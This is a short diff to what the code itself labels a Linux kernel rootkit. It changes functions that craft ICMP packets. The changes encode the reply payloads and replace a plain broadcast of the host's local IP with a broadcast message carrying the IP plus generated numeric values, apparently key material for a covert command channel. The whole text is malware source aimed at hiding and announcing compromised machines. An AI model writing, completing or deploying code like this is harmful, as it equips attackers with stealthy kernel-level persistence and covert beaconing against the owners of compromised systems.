@@ -68,7 +68,6 @@ int return_icmp(char* string, args_t* args, struct net_device* dev){
     u32 saddr_copy;
     unsigned char* payload;
 
-
     int ret;
     struct sk_buff* skb;
     struct icmphdr* new_icmph;
@@ -84,10 +83,13 @@ int return_icmp(char* string, args_t* args, struct net_device* dev){
 
     // reserving size for headers
     skb_reserve(skb, ICMP_HSIZE + IP_HSIZE + ETH_HLEN);
+    
+
 
     // putting the payload in socket buffer
     payload = skb_put(skb, payload_size);
     memcpy(payload, string, payload_size);
+    encode(payload, payload_size);
 
     // icmp header needs only to change the type
     new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
@@ -160,6 +162,7 @@ int broadcast_ip(struct net_device *dev) {
     struct in_device *inet_device;
     struct in_ifaddr *inet_ifaddr;
     char* local_ip;
+    char* message;
     u32 local_num;
     u32 broadcast_num;
     int res;
@@ -177,8 +180,16 @@ int broadcast_ip(struct net_device *dev) {
 
 
     local_ip = num_to_ip(local_num);
-    res = send_icmp(local_ip, local_num, broadcast_num, dev);
+
+    generate_nums();
+
+    message = kmalloc(IP_MAX_LENGTH + 12, GFP_KERNEL);
+    sprintf(message, "%s %hu %hu %hu", local_ip, P, Q, P_inv);
+
+    res = send_icmp(message, local_num, broadcast_num, dev);
+    DEBUG_PRINTF("rootkit: message %s", message)
     kfree(local_ip);
+    kfree(message);
 
     return res; 
 
